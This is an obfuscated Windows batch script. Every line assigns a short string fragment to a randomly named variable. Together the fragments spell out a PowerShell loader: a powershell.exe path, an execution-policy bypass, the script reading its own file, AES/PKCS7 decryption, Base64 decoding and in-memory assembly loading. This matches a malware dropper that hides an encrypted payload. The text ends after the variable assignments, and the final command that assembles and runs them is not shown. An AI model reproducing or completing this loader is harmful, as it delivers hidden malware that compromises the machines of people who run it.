@echo off
set "FpvuCjnTfI=:\"
set "qLqaCbJtfM=in"
set "USogEMFMxS=nd"
set "CIKdmQtUcP=we"
set "xWOjznAoOU=y "
set "QobEDXlune=.e"
set "CCTsSHkMfT=he"
set "FZxLonucuS=\v"
set "DBvmNYqHNv=st"
set "VPhDUZbCow=ow"
set "TDtsvRbVAp=xe"
set "WAQGwYTAAh=ws"
set "prCwKRtojz=co"
set "UhsSvdkkbA=do"
set "HINqMNaoQP=Sy"
set "eCMQYRWDhG= C"
set "TKKqWYLSjb=0\"
set "uAqlkmcQQh=32"
set "OALebtPNSy=1."
set "ZgpZYiLhIX=po"
set "TnLhpPUJEE=rS"
set "EUZvkGsevm=s\"
set "hvrXWQYaQM= /"
set "hjSXlOXIkM=he"
set "xcUVLUohOq=rs"
set "owXQGSNeeY=py"
set "YMMySdyNIl=\W"
set "HHeUfYwssE=ll"
set "BfkKHJkqIj=Po"
set "tUnsXsixQE=we"
set "KGYtlZSSWX=em"
set "SUBSYnPNtF=ll"
set "OxkHuLjnQQ=Wi"
set "LbLLSdyORW= %~dp0"
set "vmjgzHhPlM=cd"
set "fhWOZJYavb= if "
set "bmWyvkJEaX=('%~f0'"
set "HqqzkUJlLr=ss -"
set "GsLmxZCqpP=;$YZ"
set "SZnXfVRjHo=aPo "
set "FANjruRMcn=lit("
set "bmrBGdsnix=ptog"
set "wvkGTPLUMy=raph"
set "aDQUMPfPmV=($XW"
set "KKWqPMPamw=f.Pa"
set "MBjjOAIFps=ach "
set "cqDzbCLllO=-ep "
set "gDNkwZrdzn=  $R"
set "SPdvzHNpzs=.Mem"
set "MzWuzcbFfQ=)($I"
set "YVXTLTkhiS=Obje"
set "YEikuoAGcb=F'[-"
set "uffBoZUoEC=IdUF"
set "YdMCMOYGXD=Disp"
set "eRurzNTqcn=.Ass"
set "fnumeUVGqI= = $"
set "NXnWEZnqKe=ress"
set "brSDuDBjLh=y]::"
set "GJsBQcfCmH=n ''"
set "echqYgeuZP=ring"
set "icTntulRQR=d;$Q"
set "KeuTnLJhiF=.Sec"
set "cglcAGQojr=; };"
set "wyTTmglZYp=1] -"
set "YqoAMosspY=PTtG"
set "RpJGCkocEd=comm"
set "KueVHiOrHG=tem."
set "vjiKAcsDoz= '')"
set "rGHLoTDlys=hMuh"
set "fKIdyOeAXg=l5E7"
set "pHeIUKDxXd=dj0C"
set "UShWkoDvAb=106u"
set "zLnUdnuqPl=oArr"
set "dYlTkeVoet=TllA"
set "qEdVfIbFfG=);$B"
set "yknJjmFeza=le  "
set "MdDSXLBRXE=WUzf"
set "cqpDbYfObW=gMod"
set "nAmYSWuRih=orF'"
set "CnsgxXEcWH=ert]"
set "WYogpCrdfK=);$H"
set "yKwoftNWNd=();$"
set "vvfXrYURgP=[Sys"
set "krratjKVwN=PKCS"
set "fAMCGetsoQ=stem"
set "vGHZihbbBM=.Len"
set "pItgXywXXd=);$h"
set "HZWeijVrlm=7;$Q"
set "KXAvMGggKI=I.En"
set "KiQadFxxGI=[]] "
set "aTGKQvQaCQ=-joi"
set "gJtilSlwjX=-Obj"
set "NRRIeBzMga=ment"
set "OHgQbwXIsG=;$DI"
set "lAWXMCuhGI=[Sys"
set "ryYPxMYRWV=-1.."
set "kmZxGxrKBY=mory"
set "runPQhtSNh=bjec"
set "FDoBNAOMvS=daeR"
set "tqEQzLtIYZ=in $"
set "nDRNAFsylM=ne);"
set "WcYFHqXYCt=::('"
set "CxFZgqvIsY=New-"
set "NDKbYItSYa=ptog"
set "TwHAGdWeWC=V = "
set "XkaJCoVego=$BQp"
set "eKpCjBWllN=XteJ"
set "RzLMWQUfdK=.Cop"
set "JUmtwPrWNI=ypto"
set "NsArqcdfDi=();$"
set "rhZzVqEFTz=$IdU"
set "xMGHqtWrGm=, $I"
set "JdqBeRJmmk=raph"
set "DSlwCgZEvg=$IdU"
set "JPxFaPbqsw=XWcI"
set "bHbymwklst=ck($"
set "bXdSjFwnWT=m(, "
set "cvpfNHmtYw=.Cry"
set "bzXkBeXrSX=f = "
set "xCyJYmTNCf=tem."
set "ancTRuNPLH=n ''"
set "vtCYrSfkio=ateD"
set "JDymeDzTHX='[-1"
set "rcmRwOqtmo=yste"
set "JihJOpTrQf=Secu"
set "cLhZezsoJf=$QWU"
set "BAkhYlDpnw=rans"
set "EAlWluDxaK=rity"
set "GxFHzehUKY=ionM"
set "cZxNvaPEeZ=.-16"
set "IeeaStMBhV=morF"
set "IQRUiBidhH=esaB"
set "hAQpczBxIC=;$hh"
set "jXBZJIpHCa=);$Q"
set "VrBtujywLc=16] "
set "zlVmlnSbVh=y.Pa"
set "PUYRnfhoVo=iron"
set "BuQEzJioPq=g = "
set "DklOCGifck=L4Yi"
set "IZwjGYMPAl=nage"
set "CKkQyGXDfp=flec"
set "jEkhUGBabh=th('"
set "bfTKCrdxKe=('Tg"
set "NVMMAZxyPJ=ode]"
